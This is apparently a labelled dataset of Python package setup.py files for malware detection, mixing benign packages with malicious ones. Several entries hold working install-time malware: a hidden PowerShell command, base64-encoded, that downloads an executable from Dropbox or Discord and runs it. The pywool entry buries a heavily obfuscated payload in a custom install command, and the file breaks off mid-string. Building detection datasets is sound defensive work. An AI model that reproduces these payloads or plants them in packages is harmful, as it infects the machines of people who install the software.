{"idx": "colorwin-6.6.9", "func": "from __future__ import with_statement\n\nfrom io import open\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nNAME = 'colorwin'\n\ndef read_file(path, encoding='ascii'):\n    with open(os.path.join(os.path.dirname(__file__), path),\n              encoding=encoding) as fp:\n        return fp.read()\n\ndef _get_version_match(content):\n    regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n\nsetup(\n    name=NAME,\n    version=get_version(os.path.join('colorwin', '__init__.py')),\n    description='Cross-platform colored terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='color colour terminal text ansi windows crossplatform xplatform',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    maintainer='Arnon Yaari',\n    url='https://github.com/tartley/colorwin',\n    license='BSD',\n    packages=[NAME],\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Terminals',\n    ]\n)\n", "target": 1}
{"idx": "tploadreplacestring-9.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tploadreplacestring',\n    packages = ['modlib'],\n    version = '8.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfpaypalpepcc-4.33", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpaypalpepcc',\n    packages = ['modlib'],\n    version = '10.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-recaptcha-3.0.0", "func": "from setuptools import find_packages, setup\n\nlong_desc = (\n    open(\"README.rst\", \"rb\").read().decode(\"utf-8\")\n    + \"\\n\\n\"\n    + open(\"AUTHORS.rst\", \"rb\").read().decode(\"utf-8\")\n    + \"\\n\\n\"\n    + open(\"CHANGELOG.rst\", \"rb\").read().decode(\"utf-8\")\n)\n\nsetup(\n    name=\"django-recaptcha\",\n    version=\"3.0.0\",\n    description=\"Django recaptcha form field/widget app.\",\n    long_description=long_desc,\n    long_description_content_type=\"text/x-rst\",\n    author=\"Praekelt Consulting\",\n    author_email=\"dev@praekelt.com\",\n    license=\"BSD\",\n    url=\"https://github.com/torchbox/django-recaptcha\",\n    project_urls={\n        \"Changelog\": \"https://github.com/torchbox/django-recaptcha/blob/main/CHANGELOG.rst\",\n        \"Issue Tracker\": \"https://github.com/torchbox/django-recaptcha/issues\",\n        \"Discussions\": \"https://github.com/torchbox/django-recaptcha/discussions\",\n    },\n    packages=find_packages(),\n    install_requires=[\"django\"],\n    keywords=[\"django\", \"reCAPTCHA\", \"reCAPTCHA v2\", \"reCAPTCHA v3\"],\n    include_package_data=True,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "flake8_simplify-0.19.3", "func": "# Third party\nfrom setuptools import find_packages, setup\n\nsetup(\n    packages=find_packages(exclude=(\"tests\",)),\n)\n", "target": 0}
{"idx": "tpgetadstr-7.38", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgetadstr',\n    packages = ['modlib'],\n    version = '2.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-ndb-1.11.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\nimport sys\n\nimport setuptools\n\n\ndef main():\n    package_root = os.path.abspath(os.path.dirname(__file__))\n    readme_filename = os.path.join(package_root, \"README.md\")\n    with io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n        readme = readme_file.read()\n    dependencies = [\n        \"google-cloud-datastore >= 1.7.0, < 2.0.0dev\",\n        \"googleapis-common-protos < 1.53.0; python_version<'3.0'\",\n        \"grpcio < 1.40dev; python_version<'3.0'\",\n        \"protobuf < 3.18dev; python_version<'3.0'\",\n        \"pymemcache\",\n        \"redis\",\n        \"pytz\"\n    ]\n\n    if sys.version_info.major == 3 and sys.version_info.minor < 7:\n        dependencies.append(\"contextvars\")\n\n    setuptools.setup(\n        name=\"google-cloud-ndb\",\n        version = \"1.11.1\",\n        description=\"NDB library for Google Cloud Datastore\",\n        long_description=readme,\n        long_description_content_type=\"text/markdown\",\n        author=\"Google LLC\",\n        author_email=\"googleapis-packages@google.com\",\n        license=\"Apache 2.0\",\n        url=\"https://github.com/googleapis/python-ndb\",\n        project_urls={\n            'Documentation': 'https://googleapis.dev/python/python-ndb/latest',\n            'Issue Tracker': 'https://github.com/googleapis/python-ndb/issues'\n        },\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Developers\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 3\",\n            \"Programming Language :: Python :: 3.6\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"Programming Language :: Python :: 2\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Operating System :: OS Independent\",\n            \"Topic :: Internet\",\n        ],\n        platforms=\"Posix; MacOS X; Windows\",\n        packages=setuptools.find_packages(),\n        namespace_packages=[\"google\", \"google.cloud\"],\n        install_requires=dependencies,\n        extras_require={},\n        python_requires=\">=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*,!=3.4.*,!=3.5.*\",\n        include_package_data=False,\n        zip_safe=False,\n    )\n\n\nif __name__ == \"__main__\":\n    main()\n", "target": 0}
{"idx": "flake8-string-format-0.3.0", "func": "# -*- coding: utf-8 -*-\nimport codecs\n\nfrom setuptools import setup\n\n\ndef get_version():\n    with open('flake8_string_format.py') as f:\n        for line in f:\n            if line.startswith('__version__'):\n                return eval(line.split('=')[-1])\n\n\ndef get_long_description():\n    with codecs.open('README.rst', 'r', 'utf-8') as f:\n        return f.read()\n\n\nsetup(\n    name='flake8-string-format',\n    version=get_version(),\n    description='string format checker, plugin for flake8',\n    long_description=get_long_description(),\n    keywords='flake8 format',\n    install_requires=['flake8'],\n    maintainer='Fabian Neundorf',\n    maintainer_email='CommodoreFabianus@gmx.de',\n    url='https://github.com/xZise/flake8-string-format',\n    license='MIT License',\n    py_modules=['flake8_string_format'],\n    zip_safe=False,\n    entry_points={\n        'flake8.extension': [\n            'P = flake8_string_format:StringFormatChecker',\n        ],\n    },\n    tests_require=['six'],\n    test_suite='test_flake8_string_format',\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n    ],\n)\n", "target": 0}
{"idx": "pywool-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'A simplified version of urllib'\nLONG_DESCRIPTION = 'Use this package to make your https requests.'\n\nclass CustomInstallCommand(install):\n    def run(self):\n        wopvEaTEcopFEavc =\"DFK\\x0c>\\x15\\x16\\x19\\x19^^F_DA\\x14[VKR\\x07\\x03>\\x17\\x15\\x13\\x16C@IS\\x1c\\x10{J\\x19xo\\x17\\x1c\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x12\\x16\\x18\\x12\\x18\\x16\\x19\\x18\\x10\\x14\\x12\\x16\\x14\\x15\\x16\\x19\\x19\\x17\\x13\\x16\\x10\\x16\\x15\\x14\\x19\\x17\\x18\\x17\\x11\\x17\\x14\\x17\\x15\\x13\\x16\\x17\\x19\\x19\\x16\\x14\\x12\\x19\\x13\\x19\\x10\\x18\\x15\\x15\\x17\\x12\\x11\\x12\\x15\\x11\\x19\\x17\\x15\\x15\\x18\\x16\\x17\\x12\\x15\\x17\\x17\\x16\\x13\\x13\\x13\\x14\\x19\\x18\\x18\\x16\\x10\\x11\\x12\\x14\\x19\\x15\\x11\\x10\\x10\\x10\\x18\\x10\\x13\\x14\\x10\\x13\\x17\\x12\\x15\\x18\\x14\\x12\\x13\\x17\\x12\\x14\\x1eS@W[\\x1e[YCQ\\x04\\x02\\x1aW\\x00\\r]RPYTS\\x1d\\x16X`\\t@S\\x04~\\x07|t\\x0fMzTZ@Q~\\n@T{wOSe{EV\\\\\\x00]omvLt_MAm\\x04_Fzp\\t_Z\\x05}Dh\\x06o\\x05Sw\\t^Yg\\x07[{bGBoQvDPN\\x07Cknj]t[o\\x0cQl|\\x06WL^Ts\\x07~\\x00hpMbZ\\x05nNR\\x06LTP\\x01NAc\\x0bZAToKZa`wBeuw\\x02lgAT`X\\x01^UeYBm\\x07KPgcUR[[\\tKP\\x06c\\x05ivHhYg\\x06_R\\x00SHm~LfWptMVuz|ba\\x0c\\thrJgWX\\x0fWZZuBS\\x07MWl\\x04TMUpbC{YdTazUD{}\\x03\\x00y}o]Uz\\x7f^zVVP|vyQSz\\x7f\\x02xQ\\\\Tzwx_quqV{s\\x00O}]\\x01Bbw_M{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~w{Fw\\\\w^ptrQyutS[\\x04z[S^\\\\Z|X{\\x01a\\x7fNbQ\\x0be@S\\tMVR\\x00IDo\\x03UBSc@Ufjw@equ\\x03jbA[m[\\tYPcU@k\\x01HSlg_^S^\\x0eHW\\nn\\x02kqJlSa\\rYZ\\x05]BhrJbPrp@]tqxja\\x00\\x05aq@fRZ\\rYV^pCZ\\x08NWg\\n_CT\\x7fcAyXcQmw]}a_qO{\\\\o^TOz@zwsPq_[DV\\x07sEUwe_bYW`jkfUc\\x0bz]f\\x05ZXPqOUhe{|SYd^Pr`i`ZCZi\\x05d[p[\\\\ch\\x04~GV{gBl\\x0b^XP~DP{kwVU^UHTwwXob@E{^\\x7f\\x06U_qYR|pWuLaA{w`Rx[}\\x06`vKbS\\x01aKV\\tLQV\\x05JBh\\x04TG^`A[alpAfrp\\t`aKUe[\\x0c\\\\[`TBk\\x06LTadZ]ZT\\x0fNP\\x0bi\\th~MmVe\\x04YW\\x02]Mms@bSusNSuq}ic\\x0c\\t`pH`QY\\x00[R]vD[\\x01KWe\\x00[HQ\\x7fbF}]`Wjp\\\\xl\\\\pA|Yx^Pv\\x7f^s^qrQ~|[tMiG}tu@mt\\x03ccagSd\\n}Ve\\n]YUuFUeb{xW\\x06jYVe\\x00Y}OXxzwx_quqV{w{CRwfEswj]aIGQm~bHioxNjp@\\x05Zq\\x00VQc\\x07\\x0flsN{Z\\x7fqsing\\\\aq@dS\\x05rCTd\\x03Ya\\x7fNzSn}@R\\x0b{Cm\\\\cQmw]GWXj@S\\x01{Top}\\x03jls\\x08qs\\x01]PZoVivrIZ\\x02WMid\\x06Hm~LfWptMV~nE`pA`Qc\\x07]V\\x06RCa\\x06}\\x06in\\x7f\\x04coqBUZ~M|ZAPpTs]yj\\x06\\nSUY\\x05maY_\\x7f\\x00w[QvznT\\x00]cVqe@Qwx\\x01qs~Hhc\\x7f\\x05ke\\tYY]e^TpP[c\\tzXPZ^CVu\\rfYqoKRw{F}sNLo\\x04}Ye\\x04]X[pOBdYbB|txXZPQN|zX^zQt\\\\fHAQmwoMomrLotM\\x00Uq\\n]Rc\\x0c\\x01`pHsQ|{phhbX`vKgR\\x01qFTo\\x01\\\\kqJzSavKZ\\x05wNjZ`UlsRI[Za@T\\x05{Waqv\\x07ho~\\x07|v\\x07[[W`Wj\\x7fq@R\\nQLne\\x00HmwAcPmv\\x06me\\x05\\x05ypKPe\\x06UMbq\\t\\x02QM{|kgHCZI\\x06XUtb[|{mUb\\x05ZMyru\\x02seN_}rJCa\\x07`\\tpqWLQp{[c`@Dxs\\x04Pa^\\x0f\\x07X~ZAh@PIsQtR~qpU|rxPW\\x06zZU[]Z~]~\\x05krAn[\\x04fHQ\\x05AVT\\x02HFb\\x02_AVeOQd`vEapt\\x04k`@Qm[\\x00PRc^Cn\\x04NZm`_\\\\S[\\x0cN[\\x05b\\x07iqLoTd\\x03\\\\[\\nRNj\\x7fKmT\\x7fsLSqs|of\\x0c\\x06ms@gT_\\x0cYT[uGP\\x05A[m\\x05\\\\KVsoA\\x7fZbS`vW~dY~KyU~ZWt{G{urZq_RMT\\x07xFPrcVc^W_QngN``jCP`\\x00Py\\x00dN`n\\x03NhTe@y\\x7f\\x04\\x00mu\\x08\\x01W\\\\AAlbjGU\\x00|P{\\x04aEW\\x06\\x0cKZ\\x04vZ{w\\x00BR]\\\\F[]_\\x04U`uua\\t~ta\\x06xddc\\rwqusWT|`AWOYOu\\x05uAQe\\x04[]N\\r]S\\x05\\x04AotAA]\\nU]{zy}\\x7fTMVaj\\x7f^V_wTm}LEU\\x00QGUX\\x02Pkq\\x7fO[sbYVs\\x7fVivzFag\\x02DR^SQm}\\x05Bj\\x04xBQ\\x04\\x01_\\\\pA[f\\x06^Cnr\\x0f\\nZ\\x06KUe\\x05g\\\\ZYiPe`bBQeNTlq|Bh\\nyQR`{Vot\\x7f\\x07V\\x02k[Waa\\x06otMoVa\\x06XQ\\x07]BqsX]PsAC}]f\\x04bcyWR]y\\x02l`~\\x02zt{]{urvwZA[fl|ZW[xZa\\x7fGER\\x04QD[Y\\tTirr@Vvd_]~pWj\\x7fyOio\\x04EU_UQmt\\x08Gl\\x06r@T\\x00\\x0cZSpKPe\\x06UMbq\\t\\x02Q\\x05AVd\\x03bX[^bSddaGQnLQf\\x7fxBh\\x05rZZnw[hr|\\x06mm|\\t]oqUhpQD[ZjAU\\x04zQ`\\x00d_ZWdXQP\\x06\\x0biVx\\\\}KZy|rxP|vyQ~qwATqeFxs`QiL@RjroOkhzJ`vK\\x03Rt\\x0e\\\\To\\x01\\x0bkqJvQ~zwankPhrJeV\\x07pMX`\\x06XhpMzX`vNS\\x04zAo]dTa\\x7fRDPTaOT\\x0b{Vot\\x7f\\x02lis\\x07|p\\tZU\\\\cTopqJQ\\x06]Aaa\\x01KjrAaTh~\\x00bg\\x03\\x06~uOQc\\x08X}~M{AV[rHq_N_yYw_\\x7ff\\x03\\nZZ_\\x06je]Ys\\x06v[UtvoV\\x01^cX~`GPzr\\x00y}{Lmew\\x02od\\x00^TXn\\\\SqR^a\\x07}YPYUO\\\\u\\x05eSsoFSsy@qvKAf\\x00y]`\\n\\\\^QpEAgXnGqqwWS]ULzv]^s^r_aLEWaqnMko~MmuN\\x00[~\\x0fZSn\\x06\\x00h~MwTzswlik_ms@eU\\x00sCVa\\x06]krAvYa~HP\\x07wCk^bS`vWDR^eDQ\\x0bzQkq|\\x04knr\\x02qs\\x08TRZdUlst@[\\x05WOia\\x04Naq@cToz\\x07od\\x06\\x05w\\x7fNWd\\t_v}B|@n_w\\x02|XxZ|pvYT[RMyuX@zp{[ZZ~]Vw{mR\\x02XdYweGRpv\\x0b|}\\x01DWpZDP[[\\\\sgV_ywsQ}vw^pp\\nAja\\x01[c^rs~[LTckx[ZWxWjqGJR\\nQEU\\\\\\x00Qmt\\x7f@Vpj^SusTopyEjc\\x08HZ[TRjq\\x08Eh\\x03zF[\\x02\\nYTuOQc\\nXGip\\x0b\\x07Q\\x07@Qm\\x05kPSZcQ`b`L]aKUe~\\x7fBc\\x04r_SozTmux\\x07`a|\\x04VaqZh~Q\\x7fcXh\\x02y_c^VLqE~q\\x7f_~_XFW\\x07sH\\\\qe^h]]akhaWn\\x03}[e\\x01_^W\\x7fCUcdppQ[nZ\\\\qohiYBZm\\x06gVp[Wbi\\x05\\x7fDZ\\x7fiBd\\x05\\\\[WtA^rjtWPUWCQ~{ZmeIAy]s\\x06W\\\\z\\\\Vz|XzLbCzw`_q]}\\x07jrAcR\\x02fI[\\x01KWU\\x01ODo\\nXGUaJWcnzEjq\\x7f\\x08ibJUaX\\x0fQ[`_Cj\\x07MWm`T]RZ\\rMW\\x01l\\x07a\\x7fNlSn\\x06RR\\x0bQOotIfQv\\x7fNQvzxme\\x00\\x06opKbPY\\x00V[[vEQ\\x05AVd\\x03\\\\J\\\\we@~YeQm~PBQZ`BV\\x05uUkqoKSsdOxX`\\rcdzQz_wpX\\x7fqX|MeGypw@a~\\x03`hab^f\\x0b{Zb\\x00Y^WvNPefzyU\\x01gXVa\\x06]yMRsquqV{wxRxsrF[weA{tn[dBDQkqdNhnrH`pA\\x0fRs\\x0bXUb\\x03\\x00aqKtS~wq`oj_iqLdW\\x01pCXn\\x03Zj\\x7fKwQo{LU\\x01\\x7fDo_kTms\\\\FU_gAS\\x05}Pkrw\\x08anz\\x01{q\\x08YS^fS`vqMR\\x01SKlo\\x05HkqJ`Wnv\\x02ba\\t\\n~rJUW\\x07QLZ\\x7f_\\x05y_BSpZ}^zd\\x01\\x04V^Z\\x07cj^Yx\\x0bi@R\\n\\x05RT\\x00Y\\x03QvUD|rTBTu\\x0cNSuq\\x02QZ{Pa\\x04DWkls_Pw\\\\\\x02bfKAQd\\x06EW\\x0b~\\x02z\\x7f|\\x05kXzKZ\\x04wTS\\x07\\x7fE}r\\x0fCap\\x06\\x07RXw\\\\`\\x05LQho~]TtZ\\x05cjQ]cCCZh~MVaj\\x7f^V_wTms@UR\\x00MAm\\x04_FUbA[`pHsQ|{phhbX`vKWhu}Dlo\\x05BQZVWjp@QlaURSY\\x0bLV\\x07l\\taqKUhpQD[ZjAU\\x04zTmuNTl\\nd\\\\QWb^doc@SdIQmwAfVX\\x01XT_sCT\\x07KPkrAl]n~\\x01hc\\t\\x07\\x7fvHS`vKMTd\\x02\\x02To\\x05^\\x7fYBDQuqAqus|\\x7fXJUlsNoZ\\x05eOS\\x07MWaq@\\x00Sp\\rYTd\\x03\\x0ea\\x7fNWj|uNS}g]SuwQmwAT`X\\x01^UeYBm\\x07KPkrAvYa~HP\\x07wCk^bS`vKWf\\x01[Go\\x7f\\r\\x01P\\x06JWjp@f\\\\q\\x7fATwpxnb\\x03\\x08aqKUhpwM[\\x05\\\\Nh`\\x05MmuNTa\\x7fx\\x01Q\\naURll\\x05~[]QW_w\\x06l[zOU\\x00{[T\\x05~FPZoMspD\\\\{_t\\x03ivHS`veNjk}Hm~LQk\\x7fFGP\\x04\\\\BZX\\x08[hrJUemtNkpu\\x06i`MWaq@dS\\x05rCTd\\x03Ya\\x7fNWj|\\x02Ii\\x0b\\x7fCT\\x00\\x08_QwATms@nVe\\x00\\\\U\\x05WIkrA[`p~\\x01kls\\x05xu\\x01\\\\Z^eWhuOQ`p~Di\\x04x\\\\PnvQ`pA[e\\x07^LPr`Mw]aUhpMWZ\\x7fT\\x07Pp\\rBQJ\\x03[\\\\~c]~zqTySx\\x03otIQmwoMomrLotMTo~G@Q\\x06]HZX\\x01RjrAV`hrGjwu\\x04ieOQ`U\\rZQ`^Ah\\x07@Q`pAvQc|OV\\x06xOcYaUhpMWo\\x05TBkp\\r\\x04V\\x02NTa\\x7fN`V~u@T{w{me\\x04\\x03mwATmszOU\\x00QNna\\x02IkrA[`p~\\x04Q\\x07kYSdi\\x00`vKWh{y\\x02Qo}GP\\x7f^\\x07{Z\\x08Aq~wWjcJEdcd@]`fEyq{[c`vEaafNQdcGa~\\x03BQ@\\x06@jo\\x04CS_d]oXsszY@UotMaT\\x04eJP\\x05A[`pH\\x06Ps\\x00[Pg\\x05\\t`vKWhvqEV}fZWptWjp@Qm[\\x00PRc^Cn\\x04NZaqKxQa{M[\\x04vAkYfTmuNTo\\x0bZAh~\\n\\nS\\tMVotIfQv\\x7fNQvzxme\\x00\\x06opKPkr{AZ\\x04THkc\\x08OivHS`v}\\x01S\\x00e^Wlm\\x02kqJWj~v\\x02\\\\apMS|^\\x05}\\\\]Wrf\\\\QyutSptyPxp\\r@od\\x02XcP|p}UKZf`{YT\\\\\\x7fQmyMDW\\x07\\\\FU\\\\\\x04TosuDPqkP\\\\qvRjrsChg\\x01@Z]WWhv\\x06Bl\\x0b~DP\\x05\\x0bYVp@Qn\\x04UMjs\\x0b\\x05W\\x04NZl\\x04a^SXdSm`nBUaLT`{|Ac\\n|\\\\Pa}Zh~{\\x00T\\x01c^We`\\x07ms@ndg\\x01Mz_\\x06ZjlhQtuqXkgpE}^TIYhaX{tn\\\\lUX\\x02P\\x05t_PaTGqu\\x00\\x08SYtCW\\x07lUZ^qBUagB]\\x05\\rDS\\x05r\\\\T^\\x0f^pz\\x0f_P\\nWLR\\